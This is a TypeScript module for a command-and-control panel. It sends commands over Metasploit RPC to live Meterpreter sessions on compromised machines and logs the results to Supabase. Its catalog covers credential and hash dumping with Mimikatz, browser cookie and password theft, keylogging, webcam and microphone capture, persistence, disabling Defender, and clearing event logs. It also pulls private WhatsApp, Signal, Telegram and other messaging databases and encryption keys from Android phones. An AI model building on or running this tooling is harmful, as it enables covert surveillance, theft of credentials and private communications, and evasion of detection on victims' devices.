/**
 * Post-Exploitation Command Definitions & Execution Engine
 * All commands execute via live MSF RPC session.meterpreter_write/read.
 */
import { getRpcToken, rpcCall } from "../msf-rpc";

// ── Types ────────────────────────────────────────────────────

export type C2Command = {
  id: string;
  name: string;
  category: string;
  description: string;
  needsParam?: boolean;
  paramLabel?: string;
  paramPlaceholder?: string;
  dangerous?: boolean;
};

export type C2Result = {
  success: boolean;
  output: string;
  data?: unknown;
  error?: string;
};

export type AgentSession = {
  id: number;
  type: string;
  tunnel: string;
  via: string;
  info: string;
  workspace: string;
  lastSeen: string;
  platform?: string;
  arch?: string;
  username?: string;
  remoteHost?: string;
};

// ── 80+ Commands catalog ─────────────────────────────────────

const COMMAND_CATALOG: C2Command[] = [
  // ── System ──────────────────────────────────────────────────
  { id: "sysinfo",       name: "sysinfo",        category: "System",     description: "Get system info (OS, arch, domain)" },
  { id: "getuid",        name: "getuid",          category: "System",     description: "Get current user ID / SID" },
  { id: "getpid",        name: "getpid",          category: "System",     description: "Get current process ID" },
  { id: "machine_id",    name: "machine_id",      category: "System",     description: "Get machine GUID" },
  { id: "uuid",          name: "uuid",            category: "System",     description: "Get session UUID" },
  { id: "reboot",        name: "reboot",          category: "System",     description: "Reboot the target machine", dangerous: true },
  { id: "shutdown",      name: "shutdown",        category: "System",     description: "Shutdown the target machine", dangerous: true },
  { id: "sleep",         name: "sleep",           category: "System",     description: "Sleep the meterpreter payload", needsParam: true, paramLabel: "Seconds", paramPlaceholder: "30" },
  { id: "hibernate",     name: "hibernate",       category: "System",     description: "Hibernate the target machine", dangerous: true },
  { id: "lock_screen",   name: "lock_screen",     category: "System",     description: "Lock the target workstation" },
  { id: "get_time",      name: "get_time",        category: "System",     description: "Get system time on target" },
  { id: "uptime",        name: "idletime",        category: "System",     description: "Get system idle time / uptime" },
  { id: "get_env",       name: "get_env",         category: "System",     description: "Get environment variable", needsParam: true, paramLabel: "Variable", paramPlaceholder: "PATH" },
  { id: "getproxy",      name: "getproxy",        category: "System",     description: "Get proxy configuration" },

  // ── Filesystem ──────────────────────────────────────────────
  { id: "pwd",           name: "pwd",             category: "Filesystem", description: "Print working directory" },
  { id: "ls",            name: "ls",              category: "Filesystem", description: "List directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\" },
  { id: "cd",            name: "cd",              category: "Filesystem", description: "Change directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\Users" },
  { id: "download",      name: "download",        category: "Filesystem", description: "Download file from target", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "upload",        name: "upload",          category: "Filesystem", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/f C:\\f.txt" },
  { id: "cat",           name: "cat",             category: "Filesystem", description: "Read file contents", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "rm",            name: "rm",              category: "Filesystem", description: "Delete file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt", dangerous: true },
  { id: "mkdir",         name: "mkdir",           category: "Filesystem", description: "Create directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "rmdir",         name: "rmdir",           category: "Filesystem", description: "Remove directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp", dangerous: true },
  { id: "search",        name: "search",          category: "Filesystem", description: "Search for files", needsParam: true, paramLabel: "Pattern", paramPlaceholder: "*.docx" },
  { id: "move",          name: "mv",              category: "Filesystem", description: "Move/rename file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\b.txt" },
  { id: "copy",          name: "cp",              category: "Filesystem", description: "Copy file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\a.txt" },
  { id: "checksum",      name: "checksum",        category: "Filesystem", description: "Compute file checksum", needsParam: true, paramLabel: "File + algo", paramPlaceholder: "C:\\f.exe md5" },
  { id: "edit",          name: "edit",            category: "Filesystem", description: "Edit a file in vi", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "show_mount",    name: "show_mount",      category: "Filesystem", description: "Show mounted drives" },
  { id: "drive_list",    name: "run post/multi/manage/list_disk_partitions", category: "Filesystem", description: "List disk partitions" },

  // ── Process ─────────────────────────────────────────────────
  { id: "ps",            name: "ps",              category: "Process",    description: "List running processes" },
  { id: "kill",          name: "kill",            category: "Process",    description: "Kill a process by PID", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234", dangerous: true },
  { id: "execute",       name: "execute -f cmd.exe -a '/c whoami'", category: "Process", description: "Execute a system command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami" },
  { id: "migrate",       name: "migrate",         category: "Process",    description: "Migrate to another process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "pgrep",         name: "pgrep",           category: "Process",    description: "Find PID by name", needsParam: true, paramLabel: "Name", paramPlaceholder: "explorer" },
  { id: "pkill",         name: "pkill",           category: "Process",    description: "Kill process by name", needsParam: true, paramLabel: "Name", paramPlaceholder: "notepad", dangerous: true },

  // ── Network ─────────────────────────────────────────────────
  { id: "ifconfig",      name: "ifconfig",        category: "Network",    description: "Show network interfaces" },
  { id: "ipconfig",      name: "ipconfig",        category: "Network",    description: "Show IP config (Windows)" },
  { id: "route",         name: "route",           category: "Network",    description: "Show routing table" },
  { id: "netstat",       name: "netstat",         category: "Network",    description: "Show active connections" },
  { id: "arp",           name: "arp",             category: "Network",    description: "Show ARP cache" },
  { id: "portfwd",       name: "portfwd add -l 8080 -r 127.0.0.1 -p 80", category: "Network", description: "Add port forward", needsParam: true, paramLabel: "lport:rhost:rport", paramPlaceholder: "8080:127.0.0.1:80" },
  { id: "resolve",       name: "resolve",         category: "Network",    description: "Resolve hostname", needsParam: true, paramLabel: "Hostname", paramPlaceholder: "google.com" },
  { id: "arp_scan",      name: "run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24", category: "Network", description: "ARP scan local subnet", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },

  // ── Credentials ─────────────────────────────────────────────
  { id: "hashdump",      name: "hashdump",        category: "Credentials", description: "Dump Windows SAM password hashes", dangerous: true },
  { id: "loot",          name: "loot",            category: "Credentials", description: "List collected loot" },
  { id: "creds_all",     name: "creds_all",       category: "Credentials", description: "Collect all credentials" },
  { id: "mimikatz",      name: "load kiwi\nwhoami", category: "Credentials", description: "Load Mimikatz (kiwi extension)" },
  { id: "kiwi_creds",    name: "creds_all",       category: "Credentials", description: "Dump all creds via kiwi" },
  { id: "kiwi_wdigest",  name: "lsa_dump_sam",   category: "Credentials", description: "Dump NTLM hashes (kiwi)" },
  { id: "wifi_list",     name: "run post/multi/gather/wifi_credentials", category: "Credentials", description: "Dump saved WiFi passwords" },
  { id: "browser_creds", name: "run post/multi/gather/browser_credentials", category: "Credentials", description: "Dump browser saved passwords" },
  { id: "enum_logged_on",name: "run post/windows/gather/enum_logged_on_users", category: "Credentials", description: "Enum logged-on Windows users" },

  // ── Surveillance ─────────────────────────────────────────────
  { id: "webcam_list",   name: "webcam_list",     category: "Surveillance", description: "List available cameras" },
  { id: "webcam_snap",   name: "webcam_snap",     category: "Surveillance", description: "Take webcam photo", needsParam: true, paramLabel: "Camera #", paramPlaceholder: "1" },
  { id: "webcam_stream", name: "webcam_stream",   category: "Surveillance", description: "Start webcam stream", needsParam: true, paramLabel: "Camera #", paramPlaceholder: "1" },
  { id: "record_mic",    name: "record_mic",      category: "Surveillance", description: "Record microphone", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "10" },
  { id: "screenshot",    name: "screenshot",      category: "Surveillance", description: "Take screenshot of desktop" },
  { id: "screengrab",    name: "screengrab",      category: "Surveillance", description: "Grab screen pixel data" },
  { id: "keyscan_start", name: "keyscan_start",   category: "Surveillance", description: "Start keylogger" },
  { id: "keyscan_dump",  name: "keyscan_dump",    category: "Surveillance", description: "Dump captured keystrokes" },
  { id: "keyscan_stop",  name: "keyscan_stop",    category: "Surveillance", description: "Stop keylogger" },
  { id: "clipboard_get", name: "clipboard_get",   category: "Surveillance", description: "Get clipboard contents" },
  { id: "clipboard_set", name: "clipboard_set",   category: "Surveillance", description: "Set clipboard text", needsParam: true, paramLabel: "Text", paramPlaceholder: "malicious text" },
  { id: "desktop",       name: "run vnc",         category: "Surveillance", description: "VNC desktop access" },

  // ── Persistence ──────────────────────────────────────────────
  { id: "persist_service",   name: "run post/windows/manage/persistence_exe STARTUP=SCHEDULER", category: "Persistence", description: "Install scheduled-task persistence" },
  { id: "persist_registry",  name: "run post/windows/manage/persistence STARTUP=REGISTRY",      category: "Persistence", description: "Add registry run-key persistence" },
  { id: "persist_startup",   name: "run post/windows/manage/persistence STARTUP=SCHEDULER",     category: "Persistence", description: "Install startup folder persistence" },
  { id: "cleanup",           name: "clearev",     category: "Persistence", description: "Clear Windows event logs", dangerous: true },
  { id: "timestomp",         name: "timestomp",   category: "Persistence", description: "Modify file timestamps", needsParam: true, paramLabel: "File", paramPlaceholder: "C:\\evil.exe" },
  { id: "enable_rdp",        name: "run post/windows/manage/enable_rdp", category: "Persistence", description: "Enable RDP remote desktop" },
  { id: "disable_defender",  name: "run post/windows/manage/killav",     category: "Persistence", description: "Disable Windows Defender", dangerous: true },

  // ── Privilege Escalation ──────────────────────────────────────
  { id: "getsystem",    name: "getsystem",        category: "PrivEsc",    description: "Escalate to SYSTEM/root" },
  { id: "getprivs",     name: "getprivs",         category: "PrivEsc",    description: "Enable all available privileges" },
  { id: "uac_bypass",   name: "run post/windows/escalate/bypassuac",     category: "PrivEsc",    description: "Attempt UAC bypass" },
  { id: "local_exploit",name: "run post/multi/recon/local_exploit_suggester", category: "PrivEsc", description: "Find local privilege escalation paths" },

  // ── Shell ────────────────────────────────────────────────────
  { id: "shell",            name: "shell",         category: "Shell",      description: "Drop into interactive system shell" },
  { id: "powershell_shell", name: "powershell_shell", category: "Shell",   description: "Open interactive PowerShell" },
  { id: "powershell_exec",  name: "powershell_execute", category: "Shell", description: "Execute PowerShell one-liner", needsParam: true, paramLabel: "Command", paramPlaceholder: "Get-Process" },
  { id: "run_cmd",          name: "run_cmd",       category: "Shell",      description: "Run raw shell command", needsParam: true, paramLabel: "Command", paramPlaceholder: "ipconfig /all" },
  { id: "irb",              name: "irb",           category: "Shell",      description: "Open interactive Ruby shell" },

  // ── Exfil ────────────────────────────────────────────────────
  { id: "download_all",     name: "download",      category: "Exfil",     description: "Download file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\secret.txt" },
  { id: "upload_file",      name: "upload",        category: "Exfil",     description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/file.exe C:\\file.exe" },
  { id: "screenshot_exfil", name: "screenshot",    category: "Exfil",     description: "Take & save screenshot" },
  { id: "dump_tokens",      name: "use incognito\nlist_tokens -u", category: "Exfil", description: "Dump impersonation tokens" },
  { id: "exfil_docs",       name: "run post/windows/gather/collect_user_data_files", category: "Exfil", description: "Collect user documents/pictures" },
  { id: "exfil_browser",    name: "run post/multi/gather/browser_history", category: "Exfil", description: "Dump browser history" },

  // ── Root / Android ───────────────────────────────────────────
  { id: "android_upgrade",      name: "run post/multi/manage/shell_to_meterpreter", category: "Root/Android", description: "Upgrade shell → Meterpreter (Android)" },
  { id: "android_dump_sms",     name: "dump_sms",                                    category: "Root/Android", description: "Dump all SMS messages" },
  { id: "android_dump_contacts",name: "dump_contacts",                               category: "Root/Android", description: "Dump full contact list" },
  { id: "android_dump_calllog", name: "dump_calllog",                                category: "Root/Android", description: "Dump call history" },
  { id: "android_geo",          name: "geolocate",                                   category: "Root/Android", description: "Get GPS coordinates (Android)" },
  { id: "android_wipe",         name: "wipe",                                        category: "Root/Android", description: "Factory wipe device (root required)", dangerous: true },
  { id: "android_silent",       name: "set_audio_mode -m 0",                        category: "Root/Android", description: "Set audio to silent mode" },
  { id: "android_hide_icon",    name: "hide_app_icon",                               category: "Root/Android", description: "Hide payload icon from launcher" },
  { id: "android_send_sms",     name: "send_sms",                                    category: "Root/Android", description: "Send SMS from target device", needsParam: true, paramLabel: "number:message", paramPlaceholder: "+1555:hello" },
  { id: "whatsapp_db",          name: "run post/android/capture/app_data -p com.whatsapp",           category: "Root/Android", description: "Pull WhatsApp database (root)" },
  { id: "telegram_db",          name: "run post/android/capture/app_data -p org.telegram.messenger", category: "Root/Android", description: "Pull Telegram database (root)" },
  { id: "instagram_cookies",    name: "run post/android/capture/app_data -p com.instagram.android",  category: "Root/Android", description: "Pull Instagram session cookies" },
  { id: "facebook_cookies",     name: "run post/android/capture/app_data -p com.facebook.katana",    category: "Root/Android", description: "Pull Facebook session data" },

  // ── Browser / Windows ─────────────────────────────────────────
  { id: "chrome_cookies",       name: "run post/multi/gather/chrome_cookies",                       category: "Browser", description: "Steal Chrome cookies" },
  { id: "chrome_passwords",     name: "run post/multi/gather/chrome_passwords",                     category: "Browser", description: "Steal Chrome saved passwords" },
  { id: "chrome_history",       name: "run post/multi/gather/chrome_local_data",                    category: "Browser", description: "Dump Chrome browsing history" },
  { id: "firefox_creds",        name: "run post/multi/gather/firefox_creds",                        category: "Browser", description: "Dump Firefox saved credentials" },
  { id: "ie_creds",             name: "run post/windows/gather/credentials/ie",                     category: "Browser", description: "Dump IE/Edge credentials" },
  { id: "edge_creds",           name: "run post/windows/gather/credentials/windows_autologin",      category: "Browser", description: "Windows auto-login credentials" },

  // ── Windows Specific ─────────────────────────────────────────
  { id: "root_getsystem",   name: "getsystem",                                              category: "Windows", description: "SYSTEM privilege escalation" },
  { id: "root_shadow",      name: "cat /etc/shadow",                                        category: "Windows", description: "Dump /etc/shadow (Linux)" },
  { id: "root_sudoers",     name: "cat /etc/sudoers",                                       category: "Windows", description: "Read /etc/sudoers (Linux)" },
  { id: "win_browser_creds",name: "run post/windows/gather/credentials/credential_collector",category: "Windows", description: "Collect all Windows browser credentials" },
  { id: "win_tokens",       name: "use incognito\nlist_tokens -u",                          category: "Windows", description: "List Windows impersonation tokens" },
  { id: "win_clipboard",    name: "run post/windows/gather/clipboard",                      category: "Windows", description: "Full clipboard history grab" },
  { id: "win_enum_apps",    name: "run post/windows/gather/enum_applications",              category: "Windows", description: "Enumerate installed applications" },
  { id: "win_enum_shares",  name: "run post/windows/gather/enum_shares",                   category: "Windows", description: "Enumerate network shares" },
  { id: "win_enum_domain",  name: "run post/windows/gather/enum_domain",                   category: "Windows", description: "Enumerate Active Directory domain" },
  { id: "win_reg_dump",     name: "run post/windows/gather/registry_persistence",          category: "Windows", description: "Dump registry hives" },
  { id: "linux_wifi",       name: "run post/linux/gather/wifi_credentials",                category: "Windows", description: "Dump WiFi credentials (Linux)" },

  // ── Communications / Phone Calls ───────────────────────────
  { id: "call_log",              name: "dump_calllog",                                                        category: "Comms",     description: "Dump full call log history" },
  { id: "call_log_recent",       name: "run post/android/gather/sub_info",                                   category: "Comms",     description: "Get subscriber info + phone number" },
  { id: "call_record_live",      name: "record_mic -d 300",                                                   category: "Comms",     description: "Record 5 min of live audio (calls/ambient)", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "300" },
  { id: "sms_dump",              name: "dump_sms",                                                            category: "Comms",     description: "Dump all SMS / MMS messages" },
  { id: "sms_send",              name: "send_sms",                                                            category: "Comms",     description: "Send SMS from target device", needsParam: true, paramLabel: "number:message", paramPlaceholder: "+15551234:test" },
  { id: "contacts_dump",         name: "dump_contacts",                                                       category: "Comms",     description: "Dump full contact book" },
  { id: "voip_capture",          name: "record_mic -d 600",                                                   category: "Comms",     description: "Capture 10 min VoIP / call audio" },
  { id: "sim_info",              name: "run post/android/gather/sub_info",                                    category: "Comms",     description: "Get IMSI, carrier, phone number" },
  { id: "imei_imsi",             name: "run post/android/gather/device_info",                                 category: "Comms",     description: "Get IMEI / IMSI / serial number" },
  { id: "mobile_accounts",       name: "run post/android/gather/accounts",                                    category: "Comms",     description: "List all Google / device accounts" },

  // ── Social Media — WhatsApp ───────────────────────────────
  { id: "whatsapp_msgs",         name: "download /data/data/com.whatsapp/databases/msgstore.db",             category: "Social",    description: "Download WhatsApp message DB (root)" },
  { id: "whatsapp_contacts",     name: "download /data/data/com.whatsapp/databases/wa.db",                   category: "Social",    description: "Download WhatsApp contact DB" },
  { id: "whatsapp_key",          name: "download /data/data/com.whatsapp/files/key",                         category: "Social",    description: "Download WhatsApp encryption key (root)" },
  { id: "whatsapp_media",        name: "download -r /sdcard/WhatsApp/Media",                                 category: "Social",    description: "Download all WhatsApp media files" },
  { id: "whatsapp_appdata",      name: "run post/android/capture/app_data -p com.whatsapp",                 category: "Social",    description: "Full WhatsApp app data extraction" },
  { id: "whatsapp_biz",          name: "run post/android/capture/app_data -p com.whatsapp.w4b",             category: "Social",    description: "WhatsApp Business app data" },

  // ── Social Media — Telegram ───────────────────────────────
  { id: "telegram_msgs",         name: "download /data/data/org.telegram.messenger/files/cache4.db",        category: "Social",    description: "Download Telegram message cache DB" },
  { id: "telegram_appdata",      name: "run post/android/capture/app_data -p org.telegram.messenger",       category: "Social",    description: "Full Telegram app data extraction" },

  // ── Social Media — Signal ─────────────────────────────────
  { id: "signal_db",             name: "download /data/data/org.thoughtcrime.securesms/databases/signal.db",category: "Social",    description: "Download Signal DB (root required)" },
  { id: "signal_appdata",        name: "run post/android/capture/app_data -p org.thoughtcrime.securesms",   category: "Social",    description: "Signal full app data (root)" },

  // ── Social Media — Facebook / Instagram ───────────────────
  { id: "fb_messenger",          name: "download /data/data/com.facebook.orca/databases/threads_db2",       category: "Social",    description: "Download Facebook Messenger DB" },
  { id: "fb_appdata",            name: "run post/android/capture/app_data -p com.facebook.orca",            category: "Social",    description: "Facebook Messenger full data" },
  { id: "instagram_db",          name: "download /data/data/com.instagram.android/databases/direct.db",     category: "Social",    description: "Download Instagram DM database" },
  { id: "instagram_appdata",     name: "run post/android/capture/app_data -p com.instagram.android",        category: "Social",    description: "Instagram full app data" },

  // ── Social Media — Snapchat / TikTok / Twitter ───────────
  { id: "snapchat_db",           name: "download /data/data/com.snapchat.android/databases/main.db",        category: "Social",    description: "Download Snapchat database" },
  { id: "snapchat_appdata",      name: "run post/android/capture/app_data -p com.snapchat.android",         category: "Social",    description: "Snapchat full app data" },
  { id: "tiktok_db",             name: "download /data/data/com.zhiliaoapp.musically/databases/IM.db",      category: "Social",    description: "Download TikTok IM database" },
  { id: "twitter_db",            name: "download /data/data/com.twitter.android/databases/app.db",          category: "Social",    description: "Download Twitter/X database" },
  { id: "twitter_appdata",       name: "run post/android/capture/app_data -p com.twitter.android",          category: "Social",    description: "Twitter/X full app data" },

  // ── Social Media — Discord / Viber / WeChat / Line ───────
  { id: "discord_db",            name: "download /data/data/com.discord/databases/",                        category: "Social",    description: "Download Discord local databases" },
  { id: "viber_db",              name: "download /data/data/com.viber.voip/databases/",                     category: "Social",    description: "Download Viber databases" },
  { id: "wechat_db",             name: "download /data/data/com.tencent.mm/MicroMsg/",                      category: "Social",    description: "Download WeChat databases (root)" },
  { id: "line_db",               name: "download /data/data/jp.naver.line.android/databases/naver_line",    category: "Social",    description: "Download Line message database" },
  { id: "skype_db",              name: "download /data/data/com.skype.raider/databases/",                   category: "Social",    description: "Download Skype databases" },
  { id: "linkedin_db",           name: "download /data/data/com.linkedin.android/databases/",              category: "Social",    description: "Download LinkedIn databases" },

  // ── Email / Google ─────────────────────────────────────────
  { id: "gmail_db",              name: "download /data/data/com.google.android.gm/databases/",              category: "Social",    description: "Download Gmail databases" },
  { id: "gmsg_db",               name: "download /data/data/com.google.android.apps.messaging/databases/bugle_db", category: "Social", description: "Download Google Messages DB" },
  { id: "accounts_list",         name: "run post/android/gather/accounts",                                   category: "Social",    description: "List all synced accounts (Google, etc.)" },

  // ── Advanced COMMS Intel ──────────────────────────────────
  { id: "browser_cookies",       name: "run post/multi/gather/browser_cookies",                             category: "Social",    description: "Steal all browser session cookies" },
  { id: "saved_passwords",       name: "run post/multi/gather/browser_credentials",                         category: "Social",    description: "Dump all saved browser passwords" },
  { id: "wifi_passwords",        name: "run post/multi/gather/wifi_credentials",                            category: "Social",    description: "Dump all saved WiFi passwords" },
  { id: "google_auth_tokens",    name: "run post/android/gather/accounts",                                   category: "Social",    description: "Capture Google OAuth tokens" },
  { id: "app_sandbox_all",       name: "run post/android/capture/app_data",                                  category: "Social",    description: "Extract all installed app sandboxes (root)" },
];

export function getCommandsByCategory(): Record<string, C2Command[]> {
  const groups: Record<string, C2Command[]> = {};
  for (const cmd of COMMAND_CATALOG) {
    if (!groups[cmd.category]) groups[cmd.category] = [];
    groups[cmd.category].push(cmd);
  }
  return groups;
}

export function getCommand(id: string): C2Command | undefined {
  return COMMAND_CATALOG.find((c) => c.id === id);
}

export function getAllCommands(): C2Command[] {
  return [...COMMAND_CATALOG];
}

// ── Live MSF Session Command Execution ───────────────────────

/**
 * Write a command to a Meterpreter or shell session and read the output.
 * Tries meterpreter protocol first, falls back to raw shell protocol.
 * For multi-line commands (like load kiwi + creds_all), each line is sent separately.
 */
async function rawSessionCommand(sessionId: number, command: string): Promise<C2Result> {
  const token = await getRpcToken();
  const lines = command.split("\n").filter((l) => l.trim());

  try {
    let output = "";

    for (const line of lines) {
      // Write line
      await rpcCall("session.meterpreter_write", [sessionId, line + "\n"], token);
      // Wait for processing
      await new Promise((r) => setTimeout(r, 1500));

      // Read with retries until output stabilizes
      for (let i = 0; i < 5; i++) {
        const res = await rpcCall<{ data?: string; type?: string }>(
          "session.meterpreter_read", [sessionId], token,
        );
        if (res.data && res.data.length > 0) {
          output += res.data;
        }
        // Stop reading if type is "response" or no more data
        if (res.type === "response" || !res.data) break;
        await new Promise((r) => setTimeout(r, 500));
      }
    }

    return {
      success: true,
      output: output || "(command sent — no output returned)",
      data: { sessionId, command },
    };
  } catch (meterErr) {
    // Fall back to shell session protocol
    try {
      let output = "";
      for (const line of lines) {
        await rpcCall("session.shell_write", [sessionId, line + "\n"], token);
        await new Promise((r) => setTimeout(r, 1500));
        const res = await rpcCall<{ data?: string; seq?: number }>(
          "session.shell_read", [sessionId], token,
        );
        output += res.data ?? "";
      }
      return {
        success: true,
        output: output || "(shell command sent)",
        data: { sessionId, command },
      };
    } catch (shellErr) {
      return {
        success: false,
        output: "",
        error: `Session write failed: ${meterErr instanceof Error ? meterErr.message : "unknown"}`,
      };
    }
  }
}

export async function executeC2Command(
  sessionId: number,
  commandId: string,
  param?: string,
  deviceId?: string,
): Promise<C2Result> {
  const cmd = getCommand(commandId);
  if (!cmd) {
    return { success: false, output: "", error: `Unknown command: ${commandId}` };
  }

  let fullCommand = cmd.name;
  if (param && cmd.needsParam) {
    // Replace the placeholder argument in the command with the actual param
    if (fullCommand.includes(" ")) {
      fullCommand = `${fullCommand} ${param}`;
    } else {
      fullCommand = `${fullCommand} ${param}`;
    }
  }

  const result = await rawSessionCommand(sessionId, fullCommand);

  // Log to Supabase (fire-and-forget)
  if (deviceId) {
    import("../supabase").then(({ logCommand, queueOffline }) => {
      logCommand(deviceId, sessionId, fullCommand, result.output, result.success, commandId)
        .catch(() =>
          queueOffline("command", {
            device_id: deviceId, session_id: sessionId, command: fullCommand,
            output: result.output, success: result.success, command_id: commandId,
          })
        );
    }).catch(() => {});
  }

  return result;
}

export async function executeCustomCommand(
  sessionId: number,
  command: string,
  deviceId?: string,
): Promise<C2Result> {
  const result = await rawSessionCommand(sessionId, command);

  if (deviceId) {
    import("../supabase").then(({ logCommand, queueOffline }) => {
      logCommand(deviceId, sessionId, command, result.output, result.success)
        .catch(() =>
          queueOffline("command", {
            device_id: deviceId, session_id: sessionId, command,
            output: result.output, success: result.success,
          })
        );
    }).catch(() => {});
  }

  return result;
}

// ── List sessions ─────────────────────────────────────────────

export async function listAgentSessions(): Promise<AgentSession[]> {
  try {
    const token = await getRpcToken();
    const result = await rpcCall<Record<string, Record<string, string>>>(
      "session.list", [], token,
    );

    if (!result || Object.keys(result).length === 0) return [];

    return Object.entries(result).map(([id, session]) => ({
      id: Number(id),
      type:       session.type ?? "unknown",
      tunnel:     session.tunnel_peer ?? session.tunnel_local ?? "—",
      via:        session.via_exploit ?? "—",
      info:       session.info ?? "—",
      workspace:  session.workspace ?? "default",
      lastSeen:   new Date().toISOString(),
      platform:   session.platform ?? session.os_name ?? "unknown",
      arch:       session.arch ?? "unknown",
      username:   session.username ?? session.info?.split(" @")?.[0] ?? "—",
      remoteHost: session.tunnel_peer?.split(":")?.[0] ?? "—",
    }));
  } catch {
    return [];
  }
}

// ── Session detail & control ──────────────────────────────────

export async function killSession(sessionId: number): Promise<void> {
  const token = await getRpcToken();
  await rpcCall("session.stop", [sessionId], token);
}

export async function upgradeSession(sessionId: number): Promise<C2Result> {
  return rawSessionCommand(sessionId, "run post/multi/manage/shell_to_meterpreter");
}
